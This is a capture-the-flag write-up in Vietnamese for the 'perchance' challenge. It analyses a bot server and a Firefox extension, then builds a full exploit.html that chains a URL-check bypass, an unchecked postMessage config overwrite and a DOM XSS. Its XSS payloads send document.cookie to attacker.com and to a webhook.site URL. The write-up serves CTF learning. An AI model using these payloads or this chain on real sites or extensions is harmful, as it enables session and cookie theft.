# Writeup: Perchance

## 1. Cấu trúc bài toán

Khi tải source code của bài **perchance**, ta thấy cấu trúc gồm hai phần chính:
- Thư mục `src/`: Mã nguồn backend viết bằng Bun và bot điều khiển trình duyệt Firefox (Playwright).
- Thư mục `extension/`: Mã nguồn của một Firefox Web Extension được cài sẵn vào trình duyệt của bot.

Chúng ta sẽ đọc từng file, phân tích cơ chế hoạt động, suy luận lỗ hổng và từ đó xây dựng payload khai thác hoàn chỉnh.

---

## 2. Đọc mã nguồn & Phân tích từng bước

### Bước 1: Đọc `src/index.ts` — Điểm tiếp nhận đầu vào của Bot

Mở file `src/index.ts`:

```typescript
// src/index.ts
const server = Bun.serve({
  routes: {
    '/': homepage,
    '/robots.txt': new Response(await Bun.file(robots).bytes()),
    '/jsxss.js': new Response(await Bun.file(jsxss).bytes(), {
      headers: {
        'Content-Type': 'text/javascript',
        'Access-Control-Allow-Origin': '*',
      },
    }),
    '/perchance.png': new Response(await Bun.file(perchance).bytes()),
    '/perchance': {
      async POST(req) {
        if (inUse) {
          return Response.json({ ok: false, error: 'Browser is in use' }, { status: 429 });
        }

        const form = await req.formData();
        const url = form.get('perchance')?.toString();

        if (!url || !url.startsWith('https://doc.rust-lang.org')) {
          return Response.json({ ok: false, error: 'Bad url' }, { status: 400 });
        }

        try {
          inUse = true;
          console.log(`[perchance] visiting ${url}`);
          await runBrowser(url);
          console.log(`[perchance] finished visiting ${url}`);
          inUse = false;
        } catch (e) {
          console.log(`[perchance] [ERROR]`, e);
        }
        return Response.json({ ok: true });
      },
    },
  },
});
```

**🔍 Phân tích:**
- Server có endpoint `POST /perchance` nhận tham số `perchance` (URL).
- Đoạn kiểm tra: `if (!url || !url.startsWith('https://doc.rust-lang.org'))`.
- **Suy luận:** 
  - Backend chỉ dùng `startsWith('https://doc.rust-lang.org')` để validate URL dạng chuỗi chứ không parse URL hostname.
  - Ta có thể lợi dụng cú pháp **HTTP Basic Authentication trong URL**:
    $$\text{https://doc.rust-lang.org@attacker.com/exploit}$$
  - Chuỗi trên bắt đầu đúng bằng `https://doc.rust-lang.org` (thoả mãn `startsWith`), nhưng khi trình duyệt mở ra thì hostname thực tế được truy cập lại là `attacker.com`. Vậy là ta có thể ép bot truy cập vào website độc hại của mình.

---

### Bước 2: Đọc `src/browser.ts` — Nơi khởi chạy Bot và giấu Flag

Mở file `src/browser.ts`:

```typescript
// src/browser.ts
export async function runBrowser(target: string) {
  const browserTypeWithExtension = withExtension(firefox, '/app/extension');
  const browser = await browserTypeWithExtension.launch({
    headless: true,
    firefoxUserPrefs: {
      'extensions.webextensions.uuids': JSON.stringify({
        'perchance@2026.nnsc.tf': '09a6c422-a354-447d-b4ea-185cb10be869',
      }),
    },
  });
  try {
    const context = await browser.newContext();
    await context.addCookies([
      {
        name: 'flag',
        value: process.env.FLAG ?? 'NNS{example_flag}',
        domain: 'doc.rust-lang.org',
        path: '/stable/std/',
        httpOnly: false,
        sameSite: 'Strict',
      },
    ]);

    const page = await context.newPage();
    await page.goto(target);
    await Bun.sleep(1000 * 40); // 40s
    await context.close();
  } finally {
    await browser.close();
  }
}
```

**🔍 Phân tích & Suy luận:**
1. **Vị trí của Flag**: Flag nằm trong **Cookie** có tên là `flag` trên domain `doc.rust-lang.org`, path `/stable/std/`.
2. **Thuộc tính Cookie**: `httpOnly: false`. Nghĩa là nếu ta có thể thực thi mã JavaScript (XSS) trên `https://doc.rust-lang.org/stable/std/`, ta hoàn toàn đọc được flag thông qua `document.cookie`!
3. **Extension UUID**: UUID của extension được fix cứng là `09a6c422-a354-447d-b4ea-185cb10be869`. Ta có thể truy cập các trang nội bộ của extension thông qua URL: `moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html`.
4. **Mục tiêu**: Tìm cách khai thác Web Extension để đạt được **XSS trên `https://doc.rust-lang.org/stable/std/`**, từ đó đọc `document.cookie` và gửi về webhook của attacker.

---

### Bước 3: Đọc `extension/manifest.json`

Mở file `extension/manifest.json`:

```json
{
  "manifest_version": 2,
  "name": "perchance",
  "permissions": [
    "storage",
    "webNavigation",
    "tabs",
    "scripting",
    "webRequest",
    "<all_urls>"
  ],
  "background": {
    "scripts": ["background.js"],
    "persistent": true,
    "type": "module"
  },
  "web_accessible_resources": [
    "*"
  ],
  "options_ui": {
    "page": "options.html"
  }
}
```

**🔍 Phân tích & Suy luận:**
- Trường `"web_accessible_resources": ["*"]` cho phép bất kỳ trang web nào bên ngoài cũng có thể nhúng các trang nội bộ của extension (như `options.html`) vào thẻ `<iframe>`.

---

### Bước 4: Đọc `extension/options.html` & `assets/options.js`

Mở file `extension/assets/options.js`:

```javascript
// extension/assets/options.js
async function updateConfig(new_url) {
  if (!new_url.match(/^https?:\/\//)) {
    return;
  }

  let u;
  try {
    u = new URL(new_url);
  } catch {
    document.querySelector('#err').textContent = 'Unable to parse URL';
    return;
  }
  if (!u.href.includes('https://doc.rust-lang.org/')) {
    document.querySelector('#err').textContent = 'URL must be doc.rust-lang.org.';
    return;
  }

  await browser.storage.local.set({
    activateOn: u.origin,
  });
  document.querySelector('#err').textContent = 'Saved.';
}

window.addEventListener(
  'message',
  function (e) {
    let str_data = e.data;
    if (str_data.match(/^https?/)) {
      updateConfig(str_data);
    }
  },
  false,
);
```

**🔍 Phân tích:**
1. Listener `window.addEventListener('message')` lắng nghe `postMessage` từ bất kỳ cửa sổ nào mà **không kiểm tra `e.origin`**.
2. Hàm `updateConfig(new_url)` chỉ kiểm tra lỏng lẻo bằng `!u.href.includes('https://doc.rust-lang.org/')`.
3. Nếu điều kiện thỏa mãn, nó lấy `u.origin` lưu vào biến `activateOn` trong `browser.storage.local`.

**💡 Suy luận:**
- Nếu từ trang attacker, ta nhúng `options.html` vào iframe và gửi `postMessage` với nội dung:
  `http://attacker.com/?x=https://doc.rust-lang.org/`
- Vì `href` có chứa chuỗi `https://doc.rust-lang.org/`, hàm sẽ chấp nhận và lấy `u.origin` chính là `http://attacker.com`.
- Kết quả: Biến `activateOn` trong storage của extension bị **đổi thành domain của attacker**!

---

### Bước 5: Đọc `extension/background.js`

Mở file `extension/background.js`:

```javascript
// extension/background.js
(async () => {
  await browser.storage.local.set({
    activateOn: (await browser.storage.local.get('activateOn')).activateOn ?? 'https://doc.rust-lang.org/',
    previous: (await browser.storage.local.get('previous')).previous ?? 'perchance',
  });

  browser.runtime.onMessage.addListener(async (data, sender) => {
    if (data.message.type === 'updateLastUrl') {
      await browser.storage.local.set({
        previous: data.message.lastPage,
      });
    }
  });

  browser.webNavigation.onCompleted.addListener((e) => {
    browser.storage.local.get('activateOn').then((cfg) => {
      const activateOn = cfg.activateOn;
      if (!e.url.startsWith(activateOn) || !e.url.includes('https://doc.rust-lang.org/')) {
        return;
      }

      browser.scripting.executeScript({
        target: {
          tabId: e.tabId,
        },
        files: ['assets/cs.js'],
      });
    });
  });
})();
```

**🔍 Phân tích:**
- Khi một trang web load xong (`onCompleted`), extension lấy `activateOn` từ storage và kiểm tra:
  `e.url.startsWith(activateOn) && e.url.includes('https://doc.rust-lang.org/')`
- Nếu thỏa mãn, extension sẽ **inject Content Script `assets/cs.js` vào tab đó**.
- Vì ta đã đổi `activateOn = http://attacker.com`, nếu ta cho bot mở trang `http://attacker.com/stage2?x=https://doc.rust-lang.org/`, extension sẽ inject `cs.js` chạy ngay trên trang web của attacker!

---

### Bước 6: Đọc `extension/assets/cs.js` — Điểm kích hoạt XSS

Mở file `extension/assets/cs.js`:

```javascript
// extension/assets/cs.js
(async () => {
  const prev = (await browser.storage.local.get('previous')).previous;
  const elm = document.createElement('p');
  elm.innerHTML = `Previous: ${prev}`;
  document.body.appendChild(elm);

  // do not load dependencies in trusted context of the extension
  const nonce = 'a' + crypto.randomUUID().replaceAll('-', '');
  const scr = document.createElement('script');
  scr.type = 'module';
  scr.textContent = `import ${nonce} from 'http://localhost:3000/jsxss.js';
window['${nonce}']=${nonce}`;
  document.body.appendChild(scr);

  function r() {
    if (!window.wrappedJSObject[nonce]) {
      setTimeout(r, 1);
    } else {
      browser.runtime.sendMessage({
        message: {
          type: 'updateLastUrl',
          lastPage: window.wrappedJSObject[nonce](location.href),
        },
      });
    }
  }
  r();
})();
```

**🔍 Phân tích:**
1. **Lỗ hổng DOM XSS**: Đoạn đầu `elm.innerHTML = 'Previous: ' + prev;` lấy dữ liệu `previous` từ storage và chèn thẳng vào HTML. Nếu `previous` chứa payload XSS, XSS sẽ nổ trên trang mà `cs.js` được inject vào!
2. **Cơ chế cập nhật `previous`**:
   - `cs.js` sinh một biến ngẫu nhiên `nonce` (bắt đầu bằng chữ `a`).
   - Tạo thẻ `<script>` chèn vào DOM để import hàm `jsxss` gán vào `window[nonce]`.
   - `cs.js` gọi hàm lọc: `window.wrappedJSObject[nonce](location.href)`.
   - Kết quả trả về được gửi qua message `updateLastUrl` để `background.js` lưu vào biến `previous`.

**💡 Suy luận cách khai thác (DOM Hooking / Object.defineProperty):**
- Vì `cs.js` đang chạy trên trang web của attacker, mã JavaScript trên trang của attacker có toàn quyền can thiệp vào môi trường DOM (`window`).
- Ta hook `Element.prototype.appendChild` để bắt lấy thẻ `<script>` ngay khi `cs.js` vừa chèn vào body $\rightarrow$ Regex lấy ra chuỗi `nonce`.
- Dùng `Object.defineProperty(window, nonce, ...)` để định nghĩa một hàm giả mạo: Thay vì lọc XSS, hàm này sẽ trả về payload XSS của ta:
  ```html
  <img src=x onerror="new Image().src='http://attacker.com/exfil?flag='+encodeURIComponent(document.cookie)">
  ```
- Khi `cs.js` gọi `window.wrappedJSObject[nonce](location.href)`, nó nhận về chuỗi HTML XSS này và gửi cho background script lưu vào biến `previous`.
- Biến `previous` trong storage của extension chính thức bị **nhiễm độc XSS**.

---

## 3. Tổng hợp kịch bản khai thác (Exploit Flow)

1. **Gửi URL Bypass vào `/perchance`**:
   Gửi URL `https://doc.rust-lang.org@attacker.com/` đến backend để bot truy cập vào `attacker.com`.

2. **Stage 1 (Landing Page — `/`)**:
   - Iframe trang `moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html`.
   - Gửi `postMessage('http://attacker.com/?x=https://doc.rust-lang.org/', '*')` để ghi đè `activateOn = http://attacker.com`.
   - Chuyển hướng bot sang `http://attacker.com/stage2?x=https://doc.rust-lang.org/`.

3. **Stage 2 (Poison Storage — `/stage2`)**:
   - Extension inject `cs.js` vào trang này.
   - Attacker Script hook `appendChild` để lấy `nonce` và định nghĩa `window[nonce]` trả về payload XSS.
   - `cs.js` gọi hàm và gửi payload XSS lưu vào `previous`.
   - Sau khi `previous` bị đầu độc, gửi `postMessage` sang `options.html` để trả `activateOn` về `https://doc.rust-lang.org/`.
   - Chuyển hướng bot đến trang đích: `https://doc.rust-lang.org/stable/std/`.

4. **Stage 3 (Trigger XSS & Exfiltrate Flag)**:
   - Trên `https://doc.rust-lang.org/stable/std/`, extension inject `cs.js`.
   - `cs.js` thực hiện `elm.innerHTML = 'Previous: ' + prev;` $\rightarrow$ Kích nổ XSS payload.
   - Payload XSS đọc `document.cookie` (chứa `flag=NNS{...}`) và gửi về endpoint `/exfil` của attacker.

---

## 4. Payload & Mã khai thác hoàn chỉnh (Exploit)

Khác với việc phải viết một server Python phức tạp để hứng từng Stage, ta hoàn toàn có thể **tối ưu toàn bộ chuỗi khai thác vào một file HTML duy nhất**. Nhờ việc tận dụng `#hash` của URL và `MutationObserver` để xử lý Race Condition, code khai thác trở nên vô cùng ngắn gọn và thanh thoát.

Dưới đây là nội dung của file `exploit.html`. 

### File `exploit.html`
*(Host file này bằng `python3 -m http.server 8000` kết hợp với `ngrok` hoặc `localhost.run` để public)*

```html
<!DOCTYPE html>
<html>
<head>
    <title>Minimal Exploit</title>
</head>
<body>
    <h1>Exploit is running...</h1>
    <script>
        // Thay thế URL Webhook của bạn tại đây
        const WEBHOOK_URL = "https://webhook.site/ec2e4019-6730-4020-ae91-8a3e28591021";

        // Bước 1: Nếu chưa có hash mục tiêu, ta đang ở Stage 1
        if (!location.hash.includes("https://doc.rust-lang.org/")) {
            console.log("Stage 1: Poisoning activateOn...");
            const iframe = document.createElement("iframe");
            iframe.src = "moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html";
            iframe.style.opacity = "0";
            
            iframe.onload = () => {
                // Tạo URL kế tiếp có chứa hash để vượt qua check .includes()
                const next = location.origin + location.pathname + "?#https://doc.rust-lang.org/";
                iframe.contentWindow.postMessage(next, "*");
                
                setTimeout(() => {
                    location = next; // Chuyển hướng sang Stage 2
                }, 1000);
            };
            document.body.appendChild(iframe);
            
        } else {
            // Bước 2: Đã có hash, extension sẽ inject cs.js vào đây
            console.log("Stage 2: Waiting for cs.js injection...");
            
            const observer = new MutationObserver((records) => {
                for (const record of records) {
                    for (const addedNode of record.addedNodes) {
                        // Bắt sự kiện cs.js chèn thẻ script module vào DOM
                        if (addedNode.tagName === "SCRIPT" && addedNode.textContent.includes("import ")) {
                            
                            // Lấy nonce ra từ nội dung script
                            const nonce = addedNode.textContent.match(/import\s+(a[0-9a-f]+)\s+from/)[1];
                            console.log(`[+] Captured nonce: ${nonce}`);
                            
                            // Lợi dụng Race Condition: Gán thẳng window[nonce] trước khi script module kịp load!
                            window[nonce] = () => `<img src=x onerror="fetch('${WEBHOOK_URL}?flag='+encodeURIComponent(document.cookie))">`;
                            
                            console.log("[+] Payload injected. Restoring activateOn...");
                            
                            // Khôi phục lại cấu hình gốc
                            const iframe = document.createElement("iframe");
                            iframe.src = "moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html";
                            iframe.style.opacity = "0";
                            
                            iframe.onload = () => {
                                iframe.contentWindow.postMessage("https://doc.rust-lang.org/", "*");
                                
                                // Chuyển hướng bot đến trang đích để kích nổ XSS (Stage 3)
                                setTimeout(() => {
                                    console.log("Redirecting to target...");
                                    location = "https://doc.rust-lang.org/stable/std/";
                                }, 1000);
                            };
                            document.body.appendChild(iframe);
                        }
                    }
                }
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true,
            });
        }
    </script>
</body>
</html>
```

### Cách thức hoạt động tối ưu của Payload

Đoạn code trên đã dùng 3 "trick" cực kỳ thông minh để rút ngắn khai thác:

1. **Lợi dụng Race Condition (Không cần dùng `Object.defineProperty`)**: Thẻ script mà `cs.js` inject vào là `<script type="module">`. Trình duyệt sẽ tải module này **bất đồng bộ (asynchronous)**. Ta dùng `MutationObserver` để bắt đúng khoảnh khắc thẻ script chui vào DOM, rồi lập tức gán đè biến `window[nonce]` bằng XSS payload. Vòng lặp kiểm tra `setTimeout` 1ms của `cs.js` sẽ vớ ngay lấy biến ta vừa gán và chạy ngay lập tức, trước cả khi module kia kịp tải về.
2. **Gộp Query Parameter và Hash URL**: Thay vì tạo ra route `/stage2` trên server Python, payload lợi dụng việc extension kiểm tra URL lỏng lẻo bằng `includes()`. URL chuyển tiếp được gắn thêm chuỗi `?#https://doc.rust-lang.org/`. Phần sau dấu `#` là hash không gửi lên server, nhưng extension đọc URL bằng JS thì vẫn thấy có mặt chuỗi hợp lệ!
3. **Chaining bằng Event `onload`**: Sử dụng `iframe.onload` liên tiếp nhau để tự động hóa quá trình chuyển state thay vì dùng biến cờ (flag variables) và các vòng lặp kiểm tra trạng thái lằng nhằng.

### Cách chạy

1. Chạy server tĩnh ở local:
   ```bash
   python3 -m http.server 8000
   ```
2. Public port 8000 ra Internet bằng `localhost.run` (hoặc `ngrok`):
   ```bash
   ssh -o "StrictHostKeyChecking=no" -R 80:localhost:8000 nokey@localhost.run
   ```
   *(Nhận được domain ví dụ: `https://abcd123.lhr.life`)*
3. Gửi payload này vào input của challenge:
   `https://doc.rust-lang.org@abcd123.lhr.life/exploit.html`

Và chờ 40s để cờ bay thẳng về Webhook.site! 🚩
